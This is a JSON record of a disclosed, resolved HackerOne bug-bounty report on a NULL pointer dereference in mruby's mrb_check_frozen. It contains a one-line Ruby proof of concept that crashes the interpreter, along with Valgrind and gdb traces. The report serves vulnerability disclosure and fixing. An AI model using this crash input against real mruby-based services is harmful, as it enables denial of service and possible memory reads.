@@ -1,0 +1,120 @@
+{
+  "id": 621308,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MjEzMDg=",
+  "url": "https://hackerone.com/reports/621308",
+  "title": "NULL pointer dereference in `mrb_check_frozen`",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2019-06-19T21:15:30.505Z",
+  "submitted_at": "2019-06-19T21:15:30.505Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "dgaletic",
+    "url": "/dgaletic",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15668,
+    "url": "https://hackerone.com/shopify-scripts",
+    "handle": "shopify-scripts",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "shopify-scripts",
+      "twitter_handle": "",
+      "website": "",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-09-04T13:46:21.053Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-09-03T10:30:33.002Z",
+  "team_member_agreed_on_going_public_at": "2019-09-04T13:46:20.956Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "PoC\n===\nThe following demonstrates a crash:\n\n```\n3735928559.remove_instance_variable '@a'\n```\n\nDebug info\n==========\nValgrind suggests the crash happens due to an invalid read in `mrb_check_frozen`:\n\n```\n==4882== Memcheck, a memory error detector\n==4882== Copyright (C) 2002-2017, and GNU GPL'd, by Julian Seward et al.\n==4882== Using Valgrind-3.14.0 and LibVEX; rerun with -h for copyright info\n==4882== Command: mruby eraser.rb\n==4882==\n==4882== Invalid read of size 4\n==4882==    at 0x115A64: mrb_check_frozen (mruby.h:1192)\n==4882==    by 0x1165F2: mrb_iv_remove (variable.c:524)\n==4882==    by 0x17E30B: mrb_obj_remove_instance_variable (kernel.c:642)\n==4882==    by 0x16A2CE: mrb_vm_exec (vm.c:1441)\n==4882==    by 0x166BD0: mrb_vm_run (vm.c:949)\n==4882==    by 0x17AC57: mrb_top_run (vm.c:2837)\n==4882==    by 0x153783: mrb_load_exec (parse.y:6318)\n==4882==    by 0x153A56: mrb_load_file_cxt (parse.y:6327)\n==4882==    by 0x10EE1C: main (mruby.c:270)\n==4882==  Address 0xdeadbeef is not stack'd, malloc'd or (recently) free'd\n==4882==\n==4882==\n==4882== Process terminating with default action of signal 11 (SIGSEGV): dumping core\n==4882==  Access not within mapped region at address 0xDEADBEEF\n==4882==    at 0x115A64: mrb_check_frozen (mruby.h:1192)\n==4882==    by 0x1165F2: mrb_iv_remove (variable.c:524)\n==4882==    by 0x17E30B: mrb_obj_remove_instance_variable (kernel.c:642)\n==4882==    by 0x16A2CE: mrb_vm_exec (vm.c:1441)\n==4882==    by 0x166BD0: mrb_vm_run (vm.c:949)\n==4882==    by 0x17AC57: mrb_top_run (vm.c:2837)\n==4882==    by 0x153783: mrb_load_exec (parse.y:6318)\n==4882==    by 0x153A56: mrb_load_file_cxt (parse.y:6327)\n==4882==    by 0x10EE1C: main (mruby.c:270)\n```\n\nExamining it in gdb shows an attempted dereference of the pointer `o`.\n\n```\n1190│ MRB_INLINE void mrb_check_frozen(mrb_state *mrb, void *o)\n1191│ {\n1192├─> if (MRB_FROZEN_P((struct RBasic*)o)) mrb_frozen_error(mrb, o);\n1193│ }\n```\n\nThe pointer, however, doesn't contain a valid address but a value controlled by\nthe attacker -- the integer from the POC on which `remove_instance_variable` was\ncalled.\n\n```\n(gdb) p o\n$2 = (void *) 0xdeadbeef\n(gdb) f 1\n#1  0x00005555555625f3 in mrb_iv_remove (mrb=0x55555565d260, obj=..., sym=1008) at src/variable.c:524\n(gdb) p obj\n$3 = {value = {f = 1.8457939563190925e-314, p = 0xdeadbeef, i = 3735928559, sym = 3735928559}, tt = MRB_TT_FIXNUM}\n```\n\nThe POC seems to work regardless of the number used, including `0`.\n\n==========\n\nTest platform\n=============\n* Arch Linux\n\nmruby SHA: c53b7cedccf7f5260dc8b4f88c5f93ea550bc5df\n\nThank you,\nDinko Galetic\nDenis Kasak\n\n## Impact\n\nDenial of service, with a possible information leak / arbitrary memory read because of the attacker-controlled address.",
+  "bounty_amount": "1000.0",
+  "formatted_bounty": "$1,000",
+  "weakness": {
+    "id": 51,
+    "name": "NULL Pointer Dereference"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 512733,
+      "file_name": "poc",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/512/733/69d58d25cd4939ab8ead31f1726d32115ef70884/poc?response-content-disposition=attachment%3B%20filename%3D%22poc%22%3B%20filename%2A%3DUTF-8%27%27poc&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ4ABT4GR%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T132401Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBy6B6CaeGOQsHQEVf6mmFMeFsyrU6xwojWydbGY7RrjAiEAt098VbuwY4XR0q%2FhT1%2BwOM5SQIHiByhn7YH5ul9I%2Bn0qsQUIdRADGgwwMTM2MTkyNzQ4NDkiDFBaVga66U2cxXTWDSqOBZ9tNE39KmDEn1M4BXloMcPBeBllafRlZWXN4mbzGTLJ8XKW77G1i6rQMiYeX0mALiTgT6%2BCHJg%2FXOkgcCoWTiU8AGVS8ygbrG6Rmef84ITNYSRHXYOiAmAtLriRM0FNkbvdPDxzRHKptbdJe%2FxQx6iHxnF4Wbz2d%2BiPKmLG1dOUk9Wd5PcY6e%2FpFK3MQHhbP60DtFaNSQZiLijq7McbVpknudWszl6E666zMtQlGzHcdmQhcfLUGV%2Fh2eQIW07Q8StsP0DnifOlRfH5wmBWZeOVGiQmAiu4vix6Kx70b5sEUa60B8XEzX3iLRbRpvoMJI2iFfwEhBUfyAO2kQFI891jfDtZMWBRAeJzS2TDBSZOFWdllL1Ku5BlluxzcTwgDBcj6U9BeRoIR%2FE%2F%2FzJhFrI6sO4C9sHXlsgFD4n6%2BV%2BMht3eSvRmwlqvwAGbQgoXg1TnmoDMTwU9bHj7KKScAqVQBI8hZ2NsP8SjJg8QJ0z%2BQTTuA8uOznjEUpW73jDmEQTBVhmpeZcwxP4%2BU6nQB8LguHWkl5NBmrNRrQGJGWsRxHHT40HVpMkdUBcHLz%2BE4kW3xThQV2%2FnlNJrQbkP9idnhRNm421huVhZIih2gBVsmfHNfFtpBWAgyhZal1fyaA5PfM8x1h1HAwbgAbx5pWpwX6P35EkSqglhC9hYX4Mx81Hh8c9ng5X9OnjAGOW2svJkxKq9ucSCCtD2ch3QThvWYUo6MweIyhK%2Fc7x1IsUKbcstBILZpn1l%2BukPwZKsmW0eclxFPYN5toUHjUictBuWWthA5Xkwhoewwr4uhuDUwpqTTEYBtxfAUMWwC9b4A0nNdO5YVjG1Et5gL7AXZuOawjRSr2cgQxq4C6b5gjDCs62uBjqxAShKZyKgt2m88YD0Vj8P6tXU495dvL8RKU8No53RBpg%2B0AGbaXTXUqyqWqfJgpK4Oo5BMDBxlCeUem5zsmh5i1y96ARljDRINVqBbClSxSFkigseR0xhxtkfysRfAXQQYk56acdX1y%2FUUtxG304UkKPWzZsl%2FZfaTuT815tCTUHh387Az8zDogkBD5OMCSblOcOAbl2D84THnFg9dMo8QXW7aVKysLeRwOxI5twdQX9Gug%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0952bb00ce90b29e314571652e68af999c2cabd0ac3b4626720fa7befe055b9a",
+      "file_size": 41,
+      "type": "text/plain",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2019-10-03T10:30:33.072Z",
+  "allow_singular_disclosure_after": -137732008.73052138,
+  "singular_disclosure_allowed": true,
+  "vote_count": 9,
+  "voters": [
+    "p1stachios",
+    "sameerphad72",
+    "ali",
+    "mik317",
+    "z41b1337_",
+    "unravel22",
+    "quixoticluck",
+    "tej333",
+    "thetiger"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
